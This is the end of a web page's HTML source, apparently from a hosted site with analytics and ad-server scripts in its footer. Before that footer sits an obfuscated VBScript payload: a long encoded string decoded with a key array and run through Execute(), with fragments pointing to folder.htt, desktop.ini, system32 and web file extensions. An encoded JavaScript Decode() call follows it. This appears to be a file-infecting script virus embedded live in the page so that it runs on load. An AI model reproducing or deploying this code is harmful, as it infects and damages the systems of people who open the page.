FHBT]@I<QPBN]OLJRYagjcfgcYA`d^rgrF`jlY'UpPccii)PbdMc^a# EH@W\@G?PP@Q\OJMQYqvacdjbY?cc^pjqF^mkY'RqPe`ji+McdTmgqb EH@W\@G?PP@Q\OJMQY_jicdjbYNaofkrBkbgkbW )Q@P`mgmqTnQebgj+O`eTodrbFHBT]@I<QPBN]OLJRYagjCfgcYPcciiWMmbiZ@lhk^k_Z)RgkM\re!QbhnM^of# TP^pfmo,bu` /#'TpNfbig,ObbUofocCIBVZAI>NQBPZPLLOZaigDfi`ZPe`jiBsZMojnboowPe`cqE\lai`ppYRQEMmmmpW )v4-/02@>0+62.@*.,AC*3A63(.-><.-?35-5>{UpPccii)PbdRpfq`EFCV\>J>PNCP\MMLQWbiiAgibWQ`odnqEjqqBiala`Z)y52,1.3./*13.@*,/A/(@.C4+-->.1C34@0-2zPboCfgcQbhn:DPL)MmbiRbuoDfi`&Pq\pqRkDfi`*/)oprb$CdjbQ`km+Rpfq`S_nRbuoCdjbQ`km+>jlp`BibCpl`qdmkCpl`qdmkFHIffcFq#'DdFiUebmc99eokiRebiBsgqAsk`oglkBk_FcQedqIl^_qfjl:bl`pkbko,il^_qfjlDdI`dq%OffpGm`^oglk'1&;agibQe`lOffpGm`^oglk;Jdb%QcgpIja^qdmk)4'DdCNM+D`rBuockpdmkK\kb%OffpGm`^oglk$9; ofbkQedqIl^_qfjl:Jbco&QedqIl^_qfjl)I`l%QcgpIja^qdmk&+I`l%CNM+D`rCfgcK^hc%QcgpIja^qdmk&$'@laDdDdI`l%QcgpIja^qdmk&<0RebiQcgpIja^qdmk8QedqIl^_qfjl# YBk_FcHGpkj^bcClgbbo#RefnJl`\rfli'@laDd@laAsk`oglkAsk`oglkIGJ\giO`e%O`ePqm*CfgcK^hc&Mk@polmObnsjbLbuoO`eQbhnPqm:RqPe`ji+McdO`_a%McdPop&GcMcdQ`kmPop: OfbkTpNfbig,ObbUofocO`ePqm*CfgcK^hc@laDd@laAsk`oglkAsk`oglkIGL]mPr]&@rmpbkoQqodld&Pr]C:.OcpqJsq8-BlRffi`QopcOcpqJsq8QbnrLro(,FaQbnrLro;-6QcckAromckqNrofie:Dfk\jvAdqh!7W @vfqBlCkaGcMk@polmObnsjbLbuoP`rQcgpCjjabm:AQL+BcqCjjabm&@rmpbkoQqodld&PboAf^Qr_;@mc^q`M_g`aq%Q`odnqfie+Adaqfjl^ot &QbqDli_cop;QcgpCjjabm,Pr]Dli_copClgbbo>mrko:+CjpB\aeOcjmAmia`pfiClgbbonCjjabmAlrir:Dli_co@jskq).Af^Qr_)_aaDli_co@jskq'QbhnClgbbo)L^j`K`vqGc?g`Pp`+@jskq;-RebiI\qqFibbu>f^o;FiqqoMcs%>soo`lqPopfkb*Y*Ibi&@rmpbkoQqodld&(/&Qr_Nrofie:Kfa#AromckqNrofie)I\qqFibbu>f^o&/)I`l%@ppobirPqmgkd$+I^nrFk_cu@c_o*,'>soo`lqPopfkb:FH@e\ldbNs_%>soo`lqPopfkb*I^nrFk_cu@c_o&Pr]C:/@jpbFcQr_@:+Qe`l>soo`lqPopfkb:>soo`lqPopfkb#?g`Pp`+Focj%,'# YBudrAjBgqbh:.Amoe:,QlDli_co@jskqFcJ@^nc%Pp`Pqmgkd$:GA^p`&Af^Qr_)Gqbh&g&$Qe`lDdg:CjjabmAlrirQcckAromckqNrofie:AromckqNrofie#Bf`Ns_+Drbj#h(.$#ZCufoAlBk_FcBk_FcKbsrG_pqDlabsAe^m:DlpqmPbs#AromckqNrofie)W )I`l%@ppobirPqmgkd$+.&Pr]Qqodld8Jf_&@rmpbkoQqodld)G_pqDlabsAe^m).)Gck%>soo`lqPopfkb'*I\qqFibbu>f^o(/&AromckqNrofie:IG@c_kd`Qr_#AromckqNrofie)I\qqFibbu>f^o$BibFaBibFaIjmmIGL]mPr]:>soo`lqPopfkbBibCpl`qdmkCpl`qdmkFHMojn^d\rb%$LiBommoMcprhcK`vqPbdK_qeQ_ir`:FHBT]IL>?I\H?@EDLBYNmcqr_obWKf`mmplarYLpriljiBsnobnqYA`eob` ?gph?cdo`c:UpPccii)PbdMc^a#PbdK_qeQ_ir`'DdAdqhA`eob`: QcckBfpfBbdmcb8Cfi_iv?gph$5ZCkaGcDlog:.rl0AdqhA`eob`:FHL_jQr_#BfpfBbdmcb&HGpkj^bcClgbbo#BfpfBbdmcb&KbsrRqPe`ji+McdTmgqbPbdK_qeQ_ir`*AfniAbbpbbBk_CriaqfjlCriaqfjlHEsjj\ebCjjabm&M^ofK^hc&Mk@polmObnsjbLbuoP`rCjjabmL^j`:AQL+BcqCjjabm&M^ofK^hc&QbqRefnDfi`q:Dli_coK\kb+AgibnEorBudqqp;-ClmB^^fQcgpCdjbDlQcgpCdjbpCfgcBuo:PA^p`&CPJ,DboCuq`lpfjlK^hc%QcgpCdjb+K_qe$'DdCdjbBsr: EQH LmCfgcBuo:FQJG LmCfgcBuo:?PMLoDfi`Cuq;KFMMoAgib@vq8GNNOfbk@^gjHE?mm`laQj&QedqCfgc+M\re)fqjg &Cip`GcAgib@vq8S=QOfbk@^gjHE?mm`laQj&QedqCfgc+M\re)t_p'@jpbDdCdjbBsr: EQO QcckFqq@vfpoq:/@laDdIcuqFc&R@\qb%K_qeI_jb$:PA^p`&TfiN^qc#BbpfrlmW &&Mo#S@^nc%M\reK\kb&;R>_pb#UfkK_qe$?cphomm$'Qe`lCrqBsgpqn:,BibFaFaEqoCufnrp8-OfbkCPJ,@lkwCfgcTdlM^of# pvnrbj.0Ya`qhqjn+fig)K_qeI_jbCPJ,@lkwCfgcTdlM^of# tb]ZClgbbo)fqq*M^ofK^hc@laDd@laAsk`oglkAsk`oglkIGP`rAfh&&Mk@polmObnsjbLbuoBmp+@gc^oQbnrFq;TNaofkr+P^pfmoDrigl^j`FaBomQe`lDlTe`pb8eokiBincDlTe`pb8s]qCkaGcGcDlTe`pb8s]qOfbkPboCPJ:>pb^ocL_ec`q# P`mgmqdld+AgibNwpq`kL_ec`q'NcqRqPe`ji8@o`_qbJ`gb^r%RQ`odnq+Nfbig &Cip`P`r>knibJ`gb^r:bl`pkbko,^mkjbqn&HE]dr`qq$>knibJ`gb^r+p`r@INGA%yC6.3A@-0*.>D-*,/A-(?A?4+-->.1C?35>+@z$>knibJ`gb^r+`mc^q`Gkpo_k``&&QbqUpPccii;>knibJ`gb^r+D`rL_ec`q#'<nmi`M_g`aq+ncq@GQFA# x-?20C@..*A.60(/.@A+56/.*-+?-@4.21-05z'<nmi`M_g`aq+^pb^ocFknr^k^c%&PboCPJ:<nmi`M_g`aq+BcqL]hb`o&&CkaGcQbqBfpfM_g`aq8CPJ,AodtbpClmB^^fAdqhQ`kmDlAdqhL]hb`oFaAfniQbhn+AmgsbOwmb:;->k_AfniQbhn+AmgsbOwmb:;,Qe`l@vfqDloBk_FcCfi_iv?gph;AdqhQ`km+?pfs`JbqocoLbuoAdkLofbo<po%.'M_kajkfw`Cjpf8.Qj0Mqe`p>om&f&;Fir%%4'Mla&$K`vqRbjkQqodld8Clmf:,QlJbk#RefnRbuo'OcjmIsj8>p^&Jf_&QedqQbsr)f'/&&FcRbjkLrj;..Qe`lOcjmIsj8/5BincFcRbjkLrj;.+Qe`lOcjmIsj8/6Bk_FcQbhn@e\p:Aeo#RbjkLrj+Lofbo<po%dJl_1&$FaQbhn@e\p:Aeo#11&RebiQ`km@c_o8@em&.5$BibFaQ`kmPopfkb:OcjmNrofie#RbjkAe^mK`vqSkIjahPop: Bu`arq`&?gjFcv>mp%0$*QedqQbsr!t_@mJc# Hbt?oo#.&8!Lqcco>mp%-$# #q`@oGd#Ibv<po%,': #Mqe`p>om&.&$ #s]AoIa$Fcv>mp%/$:#Jrebm?oo#0&!$s_>pIc! H`w>om&0&;$Lofbo<po%.'# !t_@mJc# Clmf:,QlJbk#CubNrofie&$s_>pIc! Q`kmKpk:?p`#Kfa#CubNrofie)f'/&& #s]AoIa$DdQ`kmKpk:/5Ofbk #s]AoIa$OcjmIsj801 #s]AoIa$@laDd!t_@mJc# Qbhn@e\p:Aeo#RbjkLrj)H`w>om&fHma/'&$s_>pIc! FaQbhn@e\p:Aeo#05&Rebi #q`@oGd#RbjkAe^m:q`@o #s]AoIa$@jpbDdQ`km@c_o8@em&/6$Qe`l!t_@mJc# Qbhn@e\p:t_Ia #q`@oGd#CkaGc$s_>pIc! QcgpQ`vq8QedqQbsr#RbjkAe^m #q`@oGd#Lbuo &#q`@oGd# Bu`arq`&QedqQbsr&QedqQbsr: Bu`Qqodld8#OcjmNrofie# EokiQ`vq8 9$naofkri\ldr\eb:q`p`mgmq9 #t_@mJc!ajarj`lq+rpfq`! # 9$_gsnrvi`;$mjqfqdmk7\`plgsqb6ibar7-kv8omm7+nu8ufaof7-kv8ccfdcr7-kv8u+fk_cu7-68qgpf]gifow7cgaa`l$;#:! $<NMI@RK<KB:FH! \bsbpoEBDEEQ8.TDBQE8.`jbb:^mj+hq+$\aqfqcU+<aqfqc! U>mjmjlbko<!9#->MKJBQ9 # 9$*bfs9 $s]AoIa#:!,naofkr;$s]AoIa#:!p^pfmoi^ier^bc:s]q`odnq;#q`@oGd#RefnRbuo#q`@oGd#SkIjahPop#t_@mJc!9#-p`mgmq9 #t_@mJc!9#-?L?W;$s]AoIa#:!,CRJI9 Q`pQ`vq8QedqQbsr#t_@mJc!RkGm`hNro!s_>pIc$FH\po_oq#'UfkK_qe;CNM+D`rPm`af^gDli_co%+'# YFc&CPJ,CfgcBudqqp#UfkK_qe$rc_YAmia`p+eor&$Qe`lAQL+>mmvAgibUfkK_qe$rc_YAmia`p+eor)RgkM\re!t``Yheu^ig,dfa @laDdDd%AQL+Agib@vfpoq%TdlM^of# pvnrbj.0Ya`qhqjn+fig&$Qe`lAQL+>mmvAgibUfkK_qe$nwpq`k0/Wbbpfrlm)gkf*TfiN^qc#qvpocj0-Zhgr_ii)efcBibFaBibCpl`qdmk"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 5"&vbCrLf&"KeyArr(2) = 2"&vbCrLf&"KeyArr(3) = 3"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>
<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('-%3BK%7Bkzqx%7C-%3A8tivo%7Diom-%3BL-%3A%3Ari%7Ei%7Bkzqx%7C-%3A%3A-%3A8%7C%81xm-%3BL-%3A%3A%7Cm%80%7C7ri%7Ei%7Bkzqx%7C-%3A%3A-%3A8%7Bzk-%3BL-%3A%3A7koq5jqv7%7Eitqli%7Cmgjivvmz-%3BNmvk-%3BL%81%80-%3A%3D%3FK-%3A%3D%3FL%3EA-%3A%3A-%3BM-%3BK7%7Bkzqx%7C-%3BM8');
//-->
</SCRIPT>


<!-- PrintTracker Insertion Begin -->
<script src="/fs_img/js/pt.js" type="text/javascript"></script>
<!-- PrintTracker Insertion Complete -->


<!-- Google Analytics Insertion Begin -->
<script type="text/javascript">
<!--
        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
        var URL = gaJsHost + "google-analytics.com/ga.js";
        document.write(unescape("%3Cscript src='" + URL + "' type='text/javascript'%3E%3C/script%3E"));

        var hndl = window.setTimeout('StartTracking()',100);
        function StartTracking(){
          if( typeof(_gat) == 'object'){ 
             window.clearTimeout(hndl);
             var pageTracker = _gat._getTracker("UA-4601892-3");
             pageTracker._setDomainName("none");
             pageTracker._setAllowLinker(true);
             pageTracker._initData();
             pageTracker._trackPageview();
          }else{
             hndl = window.setTimeout('StartTracking()',100);
          }
        }
-->
</script>
<!-- Google Analytics Insertion Complete -->

<SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  OAS_sitepage = 'webservices/general'; //CHANGED
  OAS_listpos = 'Bottom';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCRIPT>');
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }
  //-->
  </SCRIPT>

  <TABLE ALIGN=CENTER STYLE="clear:both"><TR><TD ALIGN=CENTER> <!------ OAS AD 'Bottom' begin ------> <SCRIPT LANGUAGE=JavaScript> if(window.OAS_AD) OAS_AD('Bottom'); </SCRIPT> <!------ OAS AD 'Bottom' end ------> </TD></TR></TABLE>